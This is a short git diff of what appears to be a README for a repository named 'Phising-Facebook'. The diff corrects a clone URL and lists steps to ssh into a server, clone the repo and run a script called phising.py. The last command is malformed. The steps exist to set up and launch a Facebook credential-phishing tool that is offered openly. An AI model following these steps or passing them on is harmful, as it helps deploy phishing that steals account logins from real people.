@@ -2,7 +2,7 @@
 P h i s i n g   F   ac eb o o k 
 
 $ssh hostname@ip-server -p 22
-$git clone https://github.com/Anonimus-Haker-Alon-Kreker-Darker/Phising-Facebook/edit/main.git
+$git clone https://github.com/Anonimus-Haker-Alon-Kreker-Darker/Phising-Facebook.git
 $cd Phising-Facebook
 $ls
 $bash python3 phising.py
